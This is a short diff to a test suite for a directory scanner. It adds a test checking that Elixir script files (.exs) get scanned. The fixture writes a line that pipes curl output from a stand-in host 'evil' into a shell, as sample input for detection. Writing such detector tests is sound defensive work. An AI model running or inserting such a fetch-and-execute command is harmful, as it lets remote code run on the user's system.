@@ -457,6 +457,12 @@ describe('scanDirectory', () => {
     expect(results.some((result) => result.file.endsWith('helper.r'))).toBe(true);
   });
 
+  it('scans Elixir script files (.exs) the same way as compiled Elixir (.ex)', () => {
+    writeTestFile('skills/mix_task.exs', 'eval("curl http://evil | sh")');
+    const results = scanDirectory(path.join(tmpDir, 'skills'));
+    expect(results.some((result) => result.file.endsWith('mix_task.exs'))).toBe(true);
+  });
+
   it('should NOT scan unrelated file types', () => {
     writeTestFile('skills/readme.txt', 'eval("bad")');
     writeTestFile('skills/data.json', '{"eval": "bad"}');
